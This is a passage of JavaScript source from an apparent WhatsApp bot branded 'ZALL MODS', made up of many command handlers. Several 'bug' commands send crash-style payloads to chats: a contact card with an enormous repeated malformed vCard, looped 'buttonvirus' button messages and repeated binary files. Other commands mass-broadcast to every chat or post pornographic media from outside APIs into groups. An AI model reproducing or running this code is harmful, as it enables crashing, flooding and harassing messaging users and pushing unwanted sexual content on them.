m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `GITHUB`,
url: 'https://youtube.com/c/@ZallMods'
}
},
{
quickReplyButton: {
displayText: 'MENU',
id: 'menu'
}
}]
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
if (/webp/.test(mime)) {
haikal.sendMessage(i, { sticker: { url: media } }, { quoted: doc })
} else if (/image/.test(mime)) {
let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
haikal.send5ButImg(i, junn, `${global.botname}`, buffer, butoon)
} else if (/video/.test(mime)) {
let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
haikal.sendMessage(i, {video: buffer, caption: `${junn}`}, { quoted: doc })
} else if (/audio/.test(mime)) {
haikal.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : doc })
} else {
m.reply(`*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`)
}
await fs.unlinkSync(media)
}
m.reply(` *Send Broadcast To* ${anu.length} *Chats*`)
}
break
//=================================================//
case 'bugbctext': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} hwmods`
let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
haikal.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
}
m.reply('*Success Broadcast*')
}
break
//=================================================//
case 'buttonampas':
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "ZALL MODS",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
haikal.sendMessage(m.chat, buttonMessage)
}
 break
//=================================================//
case 'bugtag': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
//=================================================//
case 'hiya':{
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `ZALL MODS ${ngazap(prefix)}.BIN`, title: `ZALL MODS ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
//=================================================//
case 'bugtod': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ZALL MODS${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:ZALL MODS\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
haikal.sendContact(m.chat, global.ownerr, fkontaak)
}
}
break
//=================================================//
case 'bugbokep':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted: doc })
}
}
break
//=================================================//
case 'bugsange': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
let buttonsntnsfww = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*WELCOME\n\n
bugcrot
bugahay `, `ZALL MODS${ngazap(prefix)}`, m)
}
}
break
//=================================================//
case 'bugcrot' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let bugcrotbot = [
 {buttonId: `bugcrot`, buttonText: {displayText: buttonvirus}, type: 1},
 ]
let button3Messagess = {
image: {url:waifudd.data.url},
caption:`ZALL MODS`,
buttons: bugcrotbot,
headerType: 1
} 
 await haikal.sendMessage(m.chat, button3Messagess, { quoted: doc }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'bugahay' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 let bugahaybot = [
 {buttonId: `bugahay`, buttonText: {displayText: buttonvirus}, type: 1},
 ]
let button4Messagess = {
image: {url:waifudd.data.url},
caption:`ZALL MODS`,
buttons: bugahaybot,
headerType: 1
} 
 await haikal.sendMessage(m.chat, button4Messagess, { quoted: doc }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'jadibug1': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
//=================================================//
case 'hu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 mem = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'hi': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 mom = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'ha': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 mim = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'he': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 mum = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'ba': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 ah = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'be': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 eh = fs.readFileSync('./baseikal/sound/nob.mp3')
 haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'bu': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 ih = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'bi': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 nyong = fs.readFileSync('./baseikal/sound/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'ca': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 ri = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'ci': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 ru = fs.readFileSync('./baseikal/sound/loli.mp3')
 haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'cu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 re = fs.readFileSync('./baseikal/sound/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'co': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
 ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'ban': case 'banned': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return m.reply('*User has been banned*')
banned.push(orgnye)
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return m.reply('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Success Removing Banned Users*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'searchgroups':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
//=================================================//
case 'kal': {
if (isBan) throw sticBanLu(from)
 hey = fs.readFileSync('./baseikal/sound/tes.mp3')
 haikal.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ngakak': {
if (isBan) throw sticBanLu(from)
 hiy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ketawa': {
if (isBan) throw sticBanLu(from)
 hoy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'awkwk': {
if (isBan) throw sticBanLu(from)
 huy = fs.readFileSync('./baseikal/sound/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'bang': {
if (isBan) throw sticBanLu(from)
 mi = fs.readFileSync('./baseikal/sound/bang.mp3')
 haikal.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'nob': {
if (isBan) throw sticBanLu(from)
 miki = fs.readFileSync('./baseikal/sound/nob.mp3')
 haikal.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'musik': {
